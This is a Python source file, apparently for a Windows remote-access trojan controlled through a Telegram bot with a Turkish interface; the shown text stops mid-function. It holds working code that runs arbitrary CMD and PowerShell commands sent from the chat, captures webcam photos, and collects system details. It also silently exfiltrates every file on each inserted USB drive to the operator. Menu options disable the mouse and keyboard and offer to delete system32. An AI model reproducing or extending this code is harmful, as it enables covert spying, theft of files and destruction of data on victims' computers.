import os
import subprocess
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import platform
import winreg
import time
import sys
from datetime import datetime
import socket
import getpass
import psutil
import cv2
import win32gui
import win32process
import glob
import pythoncom
import win32com.client
import logging
from urllib.parse import quote_plus
import win32file
import win32con
import win32api
import shutil

def get_usb_drives():
    drives = []
    for drive in range(ord('A'), ord('Z')+1):
        drive_path = f"{chr(drive)}:\\" 
        try:
            if os.path.exists(drive_path) and win32file.GetDriveType(drive_path) == win32con.DRIVE_REMOVABLE:
                drives.append({
                    'path': drive_path,
                    'label': win32api.GetVolumeInformation(drive_path)[0] or 'USB Disk'
                })
        except:
            continue
    return drives

def scan_and_send_usb_files(chat_id, drive_path):
    try:
        files = []
        total_size = 0
        
        # T√ºm dosyalarƒ± topla ve boyutlarƒ±nƒ± hesapla
        for root, dirs, filenames in os.walk(drive_path):
            for filename in filenames:
                file_path = os.path.join(root, filename)
                try:
                    size = os.path.getsize(file_path)
                    total_size += size
                    files.append({
                        'path': file_path,
                        'size': size,
                        'name': filename
                    })
                except:
                    continue
        
        if not files:
            bot.send_message(chat_id, "‚ùå USB diskte dosya bulunamadƒ±.")
            return
        
        # Dosyalarƒ± boyuta g√∂re sƒ±rala (k√º√ß√ºkten b√ºy√ºƒüe)
        files.sort(key=lambda x: x['size'])
        
        # USB bilgilerini g√∂nder
        bot.send_message(
            chat_id,
            f"üíæ USB Disk Tarama Sonu√ßlarƒ±:\n"
            f"üìÅ S√ºr√ºc√º: {drive_path}\n"
            f"üìä Toplam Boyut: {total_size / (1024*1024):.2f} MB\n"
            f"üìë Dosya Sayƒ±sƒ±: {len(files)}"
        )
        
        # Dosyalarƒ± sƒ±rayla g√∂nder
        for file in files:
            try:
                with open(file['path'], 'rb') as f:
                    bot.send_document(
                        chat_id,
                        f,
                        caption=f"üìÑ {file['name']}\n"
                               f"üìç {file['path']}\n"
                               f"üìä {file['size'] / 1024:.1f} KB"
                    )
                time.sleep(1)  # Her dosya arasƒ±nda 1 saniye bekle
            except Exception as e:
                bot.send_message(
                    chat_id,
                    f"‚ùå Dosya g√∂nderilemedi: {file['path']}\nHata: {str(e)}"
                )
                
    except Exception as e:
        bot.send_message(chat_id, f"‚ùå USB disk taranƒ±rken hata olu≈ütu: {str(e)}")

def usb_drives_menu():
    keyboard = InlineKeyboardMarkup()
    drives = get_usb_drives()
    
    # Otomatik tarama butonu ekle
    keyboard.add(InlineKeyboardButton("üîÑ Otomatik USB Tarama", callback_data="auto_scan_usb"))
    
    if not drives:
        keyboard.add(InlineKeyboardButton("‚ùå USB Disk Bulunamadƒ±", callback_data="no_usb"))
    else:
        for idx, drive in enumerate(drives):
            keyboard.add(InlineKeyboardButton(
                f"üíæ {drive['label']} ({drive['path']})", 
                callback_data=f"scan_usb_{idx}"
            ))
    
    keyboard.add(InlineKeyboardButton("üîÑ Listeyi Yenile", callback_data="refresh_usb"))
    keyboard.add(InlineKeyboardButton("Ana Men√ºye D√∂n", callback_data="back_to_main"))
    return keyboard

# Otomatik USB tarama fonksiyonu
def auto_scan_usb(chat_id):
    previous_drives = set()
    
    while True:
        try:
            current_drives = set(drive['path'] for drive in get_usb_drives())
            
            # Yeni takƒ±lan USB'leri kontrol et
            new_drives = current_drives - previous_drives
            for drive in new_drives:
                bot.send_message(
                    chat_id,
                    f"üîå Yeni USB disk tespit edildi: {drive}\nTarama ba≈ülatƒ±lƒ±yor..."
                )
                scan_and_send_usb_files(chat_id, drive)
            
            previous_drives = current_drives
            time.sleep(2)  # Her 2 saniyede bir kontrol et
            
        except Exception as e:
            bot.send_message(chat_id, f"‚ùå Otomatik tarama hatasƒ±: {str(e)}")
            break

# --- Pinned Taskbar Apps Logic ---
def get_pinned_taskbar_apps():
    pinned_folder = os.path.expandvars(r"%APPDATA%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar")
    lnk_files = glob.glob(os.path.join(pinned_folder, "*.lnk"))
    apps = []
    pythoncom.CoInitialize()
    shell = win32com.client.Dispatch("WScript.Shell")
    for lnk in lnk_files:
        try:
            shortcut = shell.CreateShortCut(lnk)
            target = shortcut.Targetpath
            name = os.path.splitext(os.path.basename(lnk))[0]
            apps.append({"name": name, "path": target})
        except Exception as e:
            logging.error(f"Kƒ±sayol olu≈üturulurken hata: {str(e)}")
            continue
    return apps

def get_running_executables():
    running = set()
    for proc in psutil.process_iter(['exe']):
        try:
            proc_info = proc.info['exe']
            if proc_info:
                running.add(os.path.normcase(proc_info))
        except Exception as e:
            logging.error(f"√áalƒ±≈üan uygulama bilgisi alƒ±nƒ±rken hata: {str(e)}")
            continue
    return running
# --- End Pinned Taskbar Apps Logic ---

def get_running_processes():
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            proc_info = proc.info
            if proc_info['name'] and proc_info['exe']:
                processes.append({
                    "pid": proc_info['pid'],
                    "name": proc_info['name'],
                    "path": proc_info['exe']
                })
        except Exception as e:
            continue
    return processes

def running_processes_menu():
    keyboard = InlineKeyboardMarkup()
    processes = get_running_processes()
    
    # En fazla 10 process g√∂ster
    for proc in processes[:10]:
        keyboard.add(InlineKeyboardButton(
            f"üî¥ {proc['name']} (PID: {proc['pid']})", 
            callback_data=f"kill_process_{proc['pid']}"
        ))
    
    keyboard.add(InlineKeyboardButton("üîÑ Listeyi Yenile", callback_data="refresh_processes"))
    keyboard.add(InlineKeyboardButton("Ana Men√ºye D√∂n", callback_data="back_to_main"))
    return keyboard

# --- Taskbar windows logic ---
taskbar_windows_cache = []

def get_taskbar_windows():
    windows = []
    def enum_handler(hwnd, ctx):
        if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
            windows.append({
                "hwnd": hwnd,
                "title": win32gui.GetWindowText(hwnd)
            })
    win32gui.EnumWindows(enum_handler, None)
    return windows

def taskbar_menu():
    global taskbar_windows_cache
    keyboard = InlineKeyboardMarkup()
    windows = get_taskbar_windows()
    taskbar_windows_cache = windows
    for idx, win in enumerate(windows[:10]):
        keyboard.add(InlineKeyboardButton(f"{win['title']}", callback_data=f"activate_window_{idx}"))
    keyboard.add(InlineKeyboardButton("Ana Men√ºye D√∂n", callback_data="back_to_main"))
    return keyboard

# --- Taskbar full menu logic ---
def taskbar_full_menu():
    keyboard = InlineKeyboardMarkup()
    pinned_apps = get_pinned_taskbar_apps()
    running_exes = get_running_executables()
    global taskbar_full_cache
    taskbar_full_cache = pinned_apps
    for idx, app in enumerate(pinned_apps):
        is_running = os.path.normcase(app["path"]) in running_exes
        label = f"{app['name']} {'üü¢' if is_running else '‚ö™'}"
        keyboard.add(InlineKeyboardButton(label, callback_data=f"launch_taskbar_{idx}"))
    keyboard.add(InlineKeyboardButton("Ana Men√ºye D√∂n", callback_data="back_to_main"))
    return keyboard

taskbar_full_cache = []
# --- End Taskbar windows logic ---


def find_browser_path(browser):
    browser_paths = {
        "chrome": [
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
            os.path.expanduser("~/AppData/Local/Google/Chrome/Application/chrome.exe")
        ],
        "firefox": [
            "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe",
            os.path.expanduser("~/AppData/Local/Mozilla Firefox/firefox.exe")
        ],
        "edge": [
            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
            "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
            os.path.expanduser("~/AppData/Local/Microsoft/Edge/Application/msedge.exe")
        ],
        "brave": [
            "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
            "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
            os.path.expanduser("~/AppData/Local/BraveSoftware/Brave-Browser/Application/brave.exe")
        ],
        "opera": [
            "C:\\Program Files\\Opera\\opera.exe",
            "C:\\Program Files (x86)\\Opera\\opera.exe",
            os.path.expanduser("~/AppData/Local/Programs/Opera/opera.exe")
        ]
    }
    browser_registry = {
        "chrome": r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe",
        "firefox": r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\firefox.exe",
        "edge": r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe",
        "brave": r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\brave.exe",
        "opera": r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\opera.exe"
    }

    try:
        # Check common paths
        for path in browser_paths.get(browser, []):
            if os.path.exists(path):
                return path

        # Check registry
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, browser_registry[browser]) as key:
                browser_path = winreg.QueryValueEx(key, "")[0]
                if os.path.exists(browser_path):
                    return browser_path
        except WindowsError:
            pass

        return None
    except Exception as e:
        return None

# Telegram bot token
TELEGRAM_TOKEN = "TOKEN"
ADMIN_CHAT_ID = "5548042366"

# Initialize bot
bot = telebot.TeleBot(TELEGRAM_TOKEN)

# Store command history
command_history = []

# Get current device info
def get_current_device():
    try:
        return {
            "current_device": {
                "name": platform.node(),
                "os": platform.system()
            }
        }
    except Exception as e:
        logging.error(f"Error getting device info: {str(e)}")
        return {
            "current_device": {
                "name": "Unknown Device",
                "os": "Unknown"
            }
        }

# Build InlineKeyboard for device selection
def device_menu():
    keyboard = InlineKeyboardMarkup()
    devices = get_current_device()
    for device_id, device_info in devices.items():
        keyboard.add(InlineKeyboardButton(
            f"{device_info['name']} ({device_info['os']})", 
            callback_data=f"select_device_{device_id}"
        ))
    if not keyboard.keyboard:
        keyboard.add(InlineKeyboardButton("No devices found", callback_data="no_devices"))
    return keyboard

# Get detailed system information
def get_detailed_system_info():
    try:
        ram = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        username = getpass.getuser()
        # Find the first valid IPv4 address from all network interfaces
        ip = "Unknown"
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET and not addr.address.startswith("127."):
                    ip = addr.address
                    break
            if ip != "Unknown":
                break
        info = (
            f"üíª *Detailed System Information*\n"
            f"Operating System: {platform.system()} {platform.release()}\n"
            f"Machine: {platform.machine()}\n"
            f"Processor: {platform.processor()}\n"
            f"Computer Name: {platform.node()}\n"
            f"User: {username}\n"
            f"IP Address: {ip}\n"
            f"RAM: {ram.total // (1024**2)} MB\n"
            f"Disk: {disk.total // (1024**3)} GB\n"
        )
        return info
    except Exception as e:
        return f"Error retrieving info: {str(e)}"

# Helper function to find terminal paths (moved to global scope)
def find_terminal_path(terminal):
    terminal_paths = {
        "cmd": [
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\SysWOW64\\cmd.exe"
        ],
        "powershell": [
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
        ]
    }
    
    try:
        for path in terminal_paths.get(terminal, []):
            if os.path.exists(path):
                return path
        
        return None
    except Exception as e:
        return None

# Function to open browser with a search query
def open_browser_with_search(browser_name, query):
    try:
        browser_path = find_browser_path(browser_name)
        if not browser_path:
            return False
        
        from urllib.parse import quote_plus
        encoded_query = quote_plus(query)
        url = f"https://www.google.com/search?q={encoded_query}"
        
        subprocess.Popen([browser_path, url])
        return True
    except Exception:
        return False

# Handler for browser search input
def handle_browser_search(message):
    try:
        if message.text and " " in message.text:
            parts = message.text.split(" ", 1)
            browser_name_input = parts[0].lower()
            query = parts[1]

            supported_browsers = ["chrome", "firefox", "edge", "brave", "opera"]
            if browser_name_input in supported_browsers:
                success = open_browser_with_search(browser_name_input, query)
                if success:
                    bot.send_message(message.chat.id, f"üîé {browser_name_input.capitalize()} ile '{query}' aramasƒ± ba≈ülatƒ±ldƒ±!", reply_markup=main_menu())
                else:
                    bot.send_message(message.chat.id, f"‚ùå {browser_name_input.capitalize()} bulunamadƒ± veya arama ba≈ülatƒ±lamadƒ±.", reply_markup=main_menu())
            else:
                bot.send_message(message.chat.id, "üö´ Ge√ßersiz tarayƒ±cƒ± adƒ±. L√ºtfen desteklenen bir tarayƒ±cƒ± (chrome, firefox, edge, brave, opera) ve arama sorgusu girin.", reply_markup=main_menu())
        else:
            bot.send_message(message.chat.id, "üö´ L√ºtfen ≈üu formatta yazƒ±n: `tarayƒ±cƒ±_adƒ± arama_terimi` (√∂rneƒüin: `chrome en iyi AI modelleri`)", parse_mode='Markdown', reply_markup=main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå Tarayƒ±cƒ± aramasƒ± sƒ±rasƒ±nda bir hata olu≈ütu: {str(e)}", reply_markup=main_menu())

# Build InlineKeyboard for main menu (Keep only one definition)
def main_menu():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton("üåê Chrome", callback_data="open_chrome"),
        InlineKeyboardButton("ü¶ä Firefox", callback_data="open_firefox")
    )
    keyboard.row(
        InlineKeyboardButton("üíæ USB Diskleri Tara", callback_data="scan_usb")
    )
    keyboard.row(
        InlineKeyboardButton("üåç Edge", callback_data="open_edge"),
        InlineKeyboardButton("ü¶Å Brave", callback_data="open_brave")
    )
    keyboard.row(
        InlineKeyboardButton("üé≠ Opera", callback_data="open_opera")
    )
    keyboard.row(
        InlineKeyboardButton("üîé Tarayƒ±cƒ±da Ara", callback_data="search_browser")
    )
    keyboard.row(
        InlineKeyboardButton("‚ö° CMD", callback_data="open_cmd"),
        InlineKeyboardButton("üîß PowerShell", callback_data="open_powershell")
    )
    keyboard.row(
        InlineKeyboardButton("üíª System Info", callback_data="system_info"),
        InlineKeyboardButton("üì∑ Fotoƒüraf √áek", callback_data="take_photo")
    )
    keyboard.row(
        InlineKeyboardButton("üñ±Ô∏è Fareyi Devre Dƒ±≈üƒ± Bƒ±rak", callback_data="disable_mouse"),
        InlineKeyboardButton("‚å®Ô∏è Klavyeyi Devre Dƒ±≈üƒ± Bƒ±rak", callback_data="disable_keyboard")
    )
    keyboard.row(
        InlineKeyboardButton("‚úçÔ∏è Run Custom Command", callback_data="custom_command")
    )
    keyboard.row(
        InlineKeyboardButton("üìú Command History", callback_data="command_history")
    )
    keyboard.row(
        InlineKeyboardButton("ü™ü G√∂rev √áubuƒüu (Sabitlenmi≈ü+A√ßƒ±k)", callback_data="taskbar_full")
    )
    keyboard.row(
        InlineKeyboardButton("üìä A√ßƒ±k Programlar", callback_data="show_processes")
    )
    keyboard.row(
        InlineKeyboardButton("üîÑ Restart Bot", callback_data="restart_bot")
    )
    keyboard.row(
        InlineKeyboardButton("‚ò†Ô∏è system32 sil", callback_data="delete_system32")
    )
    keyboard.row(
        InlineKeyboardButton("üí¨ MessageBox G√∂ster", callback_data="show_messagebox")
    )
    keyboard.row(
        InlineKeyboardButton("üñ•Ô∏è CMD'de Komut √áalƒ±≈ütƒ±r", callback_data="run_cmd_command"),
        InlineKeyboardButton("üñ•Ô∏è PowerShell'de Komut √áalƒ±≈ütƒ±r", callback_data="run_ps_command")
    )
    return keyboard

# Build InlineKeyboard for command history
def history_menu():
    keyboard = InlineKeyboardMarkup()
    for idx, cmd in enumerate(command_history[-5:], 1):
        keyboard.add(InlineKeyboardButton(
            f"Komut {idx}: {cmd[:20]}...", callback_data=f"run_history_{idx-1}"
        ))
    keyboard.add(InlineKeyboardButton("Ana Men√ºye D√∂n", callback_data="back_to_main"))
    return keyboard

# Start command
@bot.message_handler(commands=['start'])
def send_start(message):
    welcome_message = (
        "ü§ñ *Geli≈ümi≈ü Kontrol Botuna Ho≈ü Geldiniz!* ü§ñ\n"
        "Sistemle etkile≈üim kurmak i√ßin a≈üaƒüƒ±daki d√ºƒümeleri kullanƒ±n.\n"
        f"Baƒülanƒ±lan Cihaz: {platform.node()}\n"
        f"Sistem: {'Windows' if platform.system() == 'Windows' else 'Diƒüer'}"
    )
    try:
        bot.send_message(message.chat.id, welcome_message, parse_mode='Markdown', reply_markup=main_menu())
    except Exception as e:
        pass

# Help command
@bot.message_handler(commands=['help'])
def send_help(message):
    help_message = (
        "üìö *Mevcut Komutlar:*\n"
        "/start - Ana men√ºy√º g√∂ster\n"
        "/help - Bu yardƒ±m mesajƒ±nƒ± g√∂ster\n"
        "\n*Butonlar:*\n"
        " - üåê Chrome: Chrome'u ba≈ülat\n"
        " - ü¶ä Firefox: Firefox'u ba≈ülat\n"
        " - üåç Edge: Edge'i ba≈ülat\n"
        " - ü¶Å Brave: Brave'i ba≈ülat\n"
        " - üé≠ Opera: Opera'yƒ± ba≈ülat\n"
        " - üîé Tarayƒ±cƒ±da Ara: Se√ßilen tarayƒ±cƒ±da Google aramasƒ± yap\n"
        " - ‚ö° CMD: Komut istemcisini a√ß\n"
        " - üîß PowerShell: PowerShell'i a√ß\n"
        " - üíª System Info: Detaylƒ± sistem bilgilerini g√∂ster\n"
        " - üì∑ Fotoƒüraf √áek: Web kamerasƒ±ndan fotoƒüraf √ßeker\n"
        " - ‚úçÔ∏è Run Custom Command: √ñzel komut √ßalƒ±≈ütƒ±r\n"
        " - üìú Command History: Komut ge√ßmi≈üini g√∂r√ºnt√ºle\n"
        " - üîÑ Restart Bot: Botu yeniden ba≈ülat\n"
        "\n*Not*: Unix komutlarƒ± otomatik olarak Windows e≈üdeƒüerlerine √ßevrilir (`ls` -> `dir`, `cat` -> `type`)."
    )
    try:
        bot.send_message(message.chat.id, help_message, parse_mode='Markdown')
    except Exception:
        pass

def handle_cmd_command(message):
    try:
        if message.text:
            terminal_path = find_terminal_path("cmd")
            if terminal_path:
                subprocess.Popen(
                    [terminal_path, "/k", message.text],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
                bot.edit_message_text(
                    "‚ö° Komut yeni CMD penceresinde √ßalƒ±≈ütƒ±rƒ±ldƒ±.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
            else:
                bot.edit_message_text(
                    "‚ùå CMD bulunamadƒ±.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
        else:
            bot.edit_message_text(
                "üö´ Komut bo≈ü olamaz.",
                chat_id=message.chat.id,
                message_id=message.message_id,
                reply_markup=main_menu()
            )
    except Exception as e:
        bot.edit_message_text(
            f"‚ùå Komut √ßalƒ±≈ütƒ±rƒ±lamadƒ±: {str(e)}",
            chat_id=message.chat.id,
            message_id=message.message_id,
            reply_markup=main_menu()
        )

def handle_ps_command(message):
    try:
        if message.text:
            terminal_path = find_terminal_path("powershell")
            if terminal_path:
                subprocess.Popen(
                    [terminal_path, "-NoExit", "-Command", message.text],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
                bot.edit_message_text(
                    "üîß Komut yeni PowerShell penceresinde √ßalƒ±≈ütƒ±rƒ±ldƒ±.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
            else:
                bot.edit_message_text(
                    "‚ùå PowerShell bulunamadƒ±.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
        else:
            bot.edit_message_text(
                "üö´ Komut bo≈ü olamaz.",
                chat_id=message.chat.id,
                message_id=message.message_id,
                reply_markup=main_menu()
            )
    except Exception as e:
        bot.edit_message_text(
            f"‚ùå Komut √ßalƒ±≈ütƒ±rƒ±lamadƒ±: {str(e)}",
            chat_id=message.chat.id,
            message_id=message.message_id,
            reply_markup=main_menu()
        )


# Handle button presses
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global taskbar_windows_cache
    try:
        if call.data == "auto_scan_usb":
            bot.edit_message_text(
                "üîÑ Otomatik USB tarama ba≈ülatƒ±ldƒ±.\nYeni USB takƒ±ldƒ±ƒüƒ±nda otomatik olarak taranacak.",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id
            )
            # Otomatik taramayƒ± ayrƒ± bir thread'de ba≈ülat
            import threading
            scan_thread = threading.Thread(
                target=auto_scan_usb,
                args=(call.message.chat.id,)
            )
            scan_thread.daemon = True
            scan_thread.start()
            
        # Tarayƒ±cƒ± a√ßma i≈ülemleri
        browsers = {
            "open_chrome": "chrome",
            "open_firefox": "firefox",
            "open_edge": "edge",
            "open_brave": "brave",
            "open_opera": "opera"
        }

        if call.data in browsers:
            browser_name = browsers[call.data]
            browser_path = find_browser_path(browser_name)
            if browser_path:
                subprocess.Popen(browser_path)
                bot.answer_callback_query(call.id, f"{browser_name.capitalize()} ba≈üarƒ±yla a√ßƒ±ldƒ±!")
                bot.send_message(call.message.chat.id, f"üåê {browser_name.capitalize()} ba≈ülatƒ±ldƒ±!", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, f"{browser_name.capitalize()} bulunamadƒ±")
                bot.send_message(call.message.chat.id, f"‚ùå {browser_name.capitalize()} bulunamadƒ±.", reply_markup=main_menu())
        
        elif call.data == "search_browser":
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "üîé Hangi tarayƒ±cƒ±da ve ne aramak istiyorsun?\nL√ºtfen ≈üu formatta yaz: `tarayƒ±cƒ±_adƒ± arama_terimi`\n(√ñrn: `chrome en son teknoloji haberleri`)",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("ƒ∞ptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(call.message, handle_browser_search)

        elif call.data == "run_cmd_command":
            sent = bot.send_message(
                call.message.chat.id,
                "‚ö° CMD'de √ßalƒ±≈ütƒ±rmak istediƒüiniz komutu giriniz:",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("ƒ∞ptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(sent, handle_cmd_command)
        elif call.data == "run_ps_command":
            sent = bot.send_message(
                call.message.chat.id,
                "üîß PowerShell'de √ßalƒ±≈ütƒ±rmak istediƒüiniz komutu giriniz:",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("ƒ∞ptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(sent, handle_ps_command)

        # CMD ve PowerShell a√ßma i≈ülemleri
        elif call.data == "open_cmd":
            terminal_path = find_terminal_path("cmd")
            if terminal_path:
                subprocess.Popen(terminal_path, creationflags=subprocess.CREATE_NEW_CONSOLE)
                bot.answer_callback_query(call.id, "CMD ba≈üarƒ±yla a√ßƒ±ldƒ±!")
                bot.send_message(call.message.chat.id, "‚ö° CMD ba≈ülatƒ±ldƒ±!", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "CMD bulunamadƒ±")
                bot.send_message(call.message.chat.id, "‚ùå CMD bulunamadƒ±.", reply_markup=main_menu())
                
        elif call.data == "open_powershell":
            terminal_path = find_terminal_path("powershell")
            if terminal_path:
                subprocess.Popen(
                    [terminal_path, "-NoExit", "-Command", 
                     "$host.UI.RawUI.WindowTitle = 'PowerShell IDE'; $host.UI.RawUI.BackgroundColor = 'Black'; $host.UI.RawUI.ForegroundColor = 'Green'; Clear-Host"],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
                bot.answer_callback_query(call.id, "PowerShell ba≈üarƒ±yla a√ßƒ±ldƒ±!")
                bot.send_message(call.message.chat.id, "üîß PowerShell ba≈ülatƒ±ldƒ±!", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "PowerShell bulunamadƒ±")
                bot.send_message(call.message.chat.id, "‚ùå PowerShell bulunamadƒ±.", reply_markup=main_menu())

        # Sistem bilgisi g√∂sterme
        elif call.data == "system_info":
            system_info = get_detailed_system_info()
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, system_info, parse_mode='Markdown', reply_markup=main_menu())

        elif call.data == "take_photo": # Yeni callback
            bot.answer_callback_query(call.id, "Fotoƒüraf √ßekme i≈ülemi ba≈ülatƒ±lƒ±yor...")
            take_photo_and_send(call.message.chat.id)

        elif call.data == "custom_command": # CHANGED if to elif
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "‚úçÔ∏è √áalƒ±≈ütƒ±rmak istediƒüiniz komutu girin (√∂rneƒüin: `dir`, `type dosya.txt`):\n\n*Not*: Unix komutlarƒ± (`ls`, `cat` vb.) otomatik olarak Windows e≈üdeƒüerlerine √ßevrilir.",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("ƒ∞ptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(call.message, run_custom_command)

        elif call.data.startswith("select_device_"):
            device_id = call.data.split("_")[-1]
            devices = get_current_device() # Bu fonksiyon sadece mevcut cihazƒ± d√∂nd√ºr√ºyor, ID bazlƒ± se√ßim i√ßin mantƒ±k g√∂zden ge√ßirilmeli
            device_info = devices.get(device_id, {}) # Eƒüer birden fazla cihaz y√∂netimi hedefleniyorsa DEVICES s√∂zl√ºƒü√º kullanƒ±lmalƒ±
            info = (
                f"üì° *Cihaz: {device_info.get('name', 'Bilinmiyor')}*\n"
                f"ƒ∞≈ületim Sistemi: {device_info.get('os', 'Yok')}"
            )
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, info, parse_mode='Markdown', reply_markup=main_menu())

        elif call.data == "no_devices":
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "üñ•Ô∏è Yapƒ±landƒ±rƒ±lmƒ±≈ü cihaz bulunamadƒ±.",
                parse_mode='Markdown',
                reply_markup=main_menu()
            )

        elif call.data == "command_history":
            if command_history:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "üìú *Son Komutlar*",
                    parse_mode='Markdown',
                    reply_markup=history_menu()
                )
            else:
                bot.answer_callback_query(call.id, "Komut ge√ßmi≈üi yok")
                bot.send_message(
                    call.message.chat.id,
                    "üìú Ge√ßmi≈üte hen√ºz komut yok.",
                    parse_mode='Markdown',
                    reply_markup=main_menu()
                )

        elif call.data.startswith("run_history_"):
            idx = int(call.data.split("_")[-1])
            if 0 <= idx < len(command_history):
                command = command_history[idx]
                bot.answer_callback_query(call.id, f"√áalƒ±≈ütƒ±rƒ±lƒ±yor: {command}")
                bot.send_message(
                    call.message.chat.id,
                    f"‚úçÔ∏è Komut √ßalƒ±≈ütƒ±rƒ±lƒ±yor: `{command}`",
                    parse_mode='Markdown',
                    reply_markup=main_menu()
                )
                run_custom_command_with_text(call.message, command) # message objesi call.message olmalƒ±
            else:
                bot.answer_callback_query(call.id, "Ge√ßersiz komut")
                bot.send_message(
                    call.message.chat.id,
                    "‚ùå Ge√ßersiz komut se√ßildi.",
                    reply_markup=main_menu()
                )
    
        elif call.data == "restart_bot":
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "üîÑ Bot yeniden ba≈ülatƒ±lƒ±yor...", parse_mode='Markdown')
            bot.stop_polling()
            os.execv(sys.executable, ['python'] + sys.argv)

        elif call.data == "cancel_command":
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "üö´ Komut giri≈üi iptal edildi.", reply_markup=main_menu())

        elif call.data == "back_to_main":
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "‚Ü©Ô∏è Ana men√ºye d√∂n√ºld√º.", reply_markup=main_menu())

        elif call.data == "scan_usb":
            bot.edit_message_text(
                "üíæ USB Diskleri Taranƒ±yor...",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=usb_drives_menu()
            )
            
        elif call.data.startswith("scan_usb_"):
            try:
                idx = int(call.data.split("_")[2])
                drives = get_usb_drives()
                if idx < len(drives):
                    drive = drives[idx]
                    bot.edit_message_text(
                        f"üíæ {drive['label']} ({drive['path']}) taranƒ±yor...",
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id
                    )
                    scan_and_send_usb_files(call.message.chat.id, drive['path'])
                    bot.send_message(
                        call.message.chat.id,
                        "‚úÖ USB disk taramasƒ± tamamlandƒ±!",
                        reply_markup=main_menu()
                    )
            except Exception as e:
                bot.answer_callback_query(call.id, f"‚ùå Hata: {str(e)}")
                
        elif call.data == "refresh_usb":
            bot.edit_message_text(
                "üíæ USB Diskleri Taranƒ±yor...",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=usb_drives_menu()
            )

        elif call.data == "show_processes":
            bot.edit_message_text(
                "üìä *√áalƒ±≈üan Programlar*\n"
                "Kapatmak istediƒüiniz programa tƒ±klayƒ±n:",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                parse_mode='Markdown',
                reply_markup=running_processes_menu()
            )
            
        elif call.data == "refresh_processes":
            try:
                bot.edit_message_text(
                    "üìä √áalƒ±≈üan Programlar:",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=running_processes_menu()
                )
                bot.answer_callback_query(call.id, "‚úÖ Liste yenilendi!")
            except Exception as e:
                bot.answer_callback_query(call.id, "‚ùå Liste yenilenemedi!")
                bot.send_message(
                    call.message.chat.id,
                    f"‚ùå Hata olu≈ütu: {str(e)}",
                    reply_markup=main_menu()
                )
            
        elif call.data.startswith("kill_process_"):
            pid = int(call.data.split("_")[2])
            try:
                process = psutil.Process(pid)
                process_name = process.name()
                process.terminate()
                bot.answer_callback_query(call.id, f"‚úÖ {process_name} ba≈üarƒ±yla kapatƒ±ldƒ±!")
                # Listeyi yenile
                bot.edit_message_text(
                    "üìä *√áalƒ±≈üan Programlar*\n"
                    "Kapatmak istediƒüiniz programa tƒ±klayƒ±n:",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    parse_mode='Markdown',
                    reply_markup=running_processes_menu()
                )
            except Exception as e:
